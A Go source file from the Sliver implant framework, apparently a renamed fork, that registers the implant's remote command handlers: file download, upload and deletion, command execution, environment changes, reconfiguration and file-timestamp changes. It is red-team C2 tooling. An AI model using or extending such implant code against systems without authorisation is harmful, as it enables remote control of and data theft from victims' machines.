//go:build !(linux || darwin || windows)

package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	----------------------------------------------------------------------

	This file contains only pure Go handlers, which can be compiled for any
	platform/arch.

*/

import (
	"os"
	"github.com/starkzarn/glod/protobuf/glodpb"
)

var (
	genericHandlers = map[uint32]RPCHandler{
		glodpb.MsgPing:           pingHandler,
		glodpb.MsgLsReq:          dirListHandler,
		glodpb.MsgDownloadReq:    downloadHandler,
		glodpb.MsgUploadReq:      uploadHandler,
		glodpb.MsgCdReq:          cdHandler,
		glodpb.MsgPwdReq:         pwdHandler,
		glodpb.MsgRmReq:          rmHandler,
		glodpb.MsgMkdirReq:       mkdirHandler,
		glodpb.MsgMvReq:          mvHandler,
		glodpb.MsgExecuteReq:     executeHandler,
		glodpb.MsgSetEnvReq:      setEnvHandler,
		glodpb.MsgEnvReq:         getEnvHandler,
		glodpb.MsgUnsetEnvReq:    unsetEnvHandler,
		glodpb.MsgReconfigureReq: reconfigureHandler,
		glodpb.MsgChtimesReq:     chtimesHandler,
	}
)

// GetSystemHandlers - Returns a map of the generic handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return genericHandlers
}

// GetSystemPivotHandlers - Not supported
func GetSystemPivotHandlers() map[uint32]PivotHandler {
	return map[uint32]PivotHandler{}
}

// Stub
func getUid(fileInfo os.FileInfo) (string) {
	return ""
}

// Stub
func getGid(fileInfo os.FileInfo) (string) {
	return ""
}
